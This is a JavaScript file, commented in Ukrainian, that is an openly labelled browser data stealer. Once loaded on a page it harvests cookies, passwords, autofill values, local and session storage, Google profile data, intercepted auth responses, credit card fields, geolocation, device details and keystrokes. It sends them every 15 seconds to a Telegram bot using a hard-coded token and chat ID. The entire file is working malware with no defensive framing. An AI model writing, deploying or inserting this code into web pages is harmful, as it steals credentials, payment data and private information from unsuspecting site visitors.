(function(){
    // Конфігурація з вашими даними
    const BOT_TOKEN = '8101956095:AAF72VNrqd9Jxlz0nBL5LqmKgveEPh7b75Q';
    const CHAT_ID = '8463942433';
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Крок 1A: Миттєва ініціалізація без затримок
    window.__collected = [];
    window.__stolen_data = {};

    // Крок 1B: Функція відправки в Telegram
    const sendToTelegram = (data) => {
        try {
            const message = encodeURIComponent('🔥 НОВІ ДАНІ 🔥\n' + JSON.stringify(data, null, 2));
            navigator.sendBeacon(TELEGRAM_API + `?chat_id=${CHAT_ID}&text=${message}`);
            
            // Дублювання через fetch
            fetch(TELEGRAM_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `chat_id=${CHAT_ID}&text=${message}&parse_mode=HTML`
            }).catch(e => {});
        } catch(e) {}
    };

    // Крок 1C: Збір всіх Google cookies
    const stealAllCookies = () => {
        try {
            document.cookie.split(';').forEach(cookie => {
                window.__collected.push(['COOKIE', cookie.trim()]);
            });
        } catch(e) {}
    };

    // Крок 2A: Збір паролів з форм
    const stealAllPasswords = () => {
        try {
            const inputs = document.querySelectorAll('input[type="password"]');
            inputs.forEach(input => {
                if (input.value) window.__collected.push(['PASSWORD', input.value, input.name]);
            });
        } catch(e) {}
    };

    // Крок 2B: Збір всіх даних автозаповнення
    const stealAllAutofill = () => {
        try {
            const inputs = document.querySelectorAll('input, textarea, select');
            inputs.forEach(input => {
                if (input.value && input.value.length > 1) {
                    window.__collected.push(['AUTOFILL', input.name, input.value, input.type]);
                }
            });
        } catch(e) {}
    };

    // Крок 2C: Повний збір localStorage
    const stealAllStorage = () => {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                window.__collected.push(['LOCAL_STORAGE', key, localStorage.getItem(key)]);
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                window.__collected.push(['SESSION_STORAGE', key, sessionStorage.getItem(key)]);
            }
        } catch(e) {}
    };

    // Крок 3A: Збір Google аккаунта
    const stealGoogleAccount = () => {
        try {
            if (window.gapi && window.gapi.auth2) {
                window.gapi.auth2.getAuthInstance().then(auth => {
                    const user = auth.currentUser.get();
                    const profile = user.getBasicProfile();
                    window.__collected.push(['GOOGLE_PROFILE', {
                        name: profile.getName(),
                        email: profile.getEmail(),
                        image: profile.getImageUrl(),
                        id: profile.getId()
                    }]);
                });
            }
        } catch(e) {}
    };

    // Крок 3B: Перехоплення всіх мережевих запитів
    const interceptAllRequests = () => {
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
                response.clone().text().then(text => {
                    if (text.includes('token') || text.includes('auth') || text.includes('password')) {
                        window.__collected.push(['NETWORK_REQUEST', args[0], text.substring(0, 500)]);
                    }
                });
                return response;
            });
        };
    };

    // Крок 3C: Збір кредитних карт
    const stealCreditCards = () => {
        try {
            const ccInputs = document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"]');
            ccInputs.forEach(input => {
                if (input.value) window.__collected.push(['CREDIT_CARD', input.name, input.value]);
            });
        } catch(e) {}
    };

    // Крок 4A: Збір геолокації
    const stealLocation = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    window.__collected.push(['GEOLOCATION', 
                        pos.coords.latitude, 
                        pos.coords.longitude
                    ]);
                },
                err => {},
                {timeout: 5000}
            );
        }
    };

    // Крок 4B: Збір інформації про пристрій
    const stealDeviceInfo = () => {
        window.__collected.push(['DEVICE_INFO', {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled()
        }]);
    };

    // Крок 4C: Моніторинг введення даних
    const monitorInputs = () => {
        document.addEventListener('input', (e) => {
            if (e.target.value && e.target.value.length > 3) {
                window.__collected.push(['KEYSTROKE', e.target.name, e.target.value]);
            }
        }, true);
    };

    // Крок 5A: Основний процес збору
    const startCollection = () => {
        stealAllCookies();
        stealAllPasswords();
        stealAllAutofill();
        stealAllStorage();
        stealGoogleAccount();
        interceptAllRequests();
        stealCreditCards();
        stealLocation();
        stealDeviceInfo();
        monitorInputs();

        // Відправка даних кожні 15 секунд
        setInterval(() => {
            if (window.__collected.length > 0) {
                sendToTelegram(window.__collected);
                window.__collected = [];
            }
        }, 15000);

        // Одноразова відправка через 3 секунди
        setTimeout(() => {
            sendToTelegram(['INITIAL_COLLECTION_COMPLETE', window.location.href]);
        }, 3000);
    };

    // Крок 5B: Запуск негайно
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startCollection);
    } else {
        startCollection();
    }

    // Крок 5C: Резервний запуск
    setTimeout(startCollection, 1000);
})();
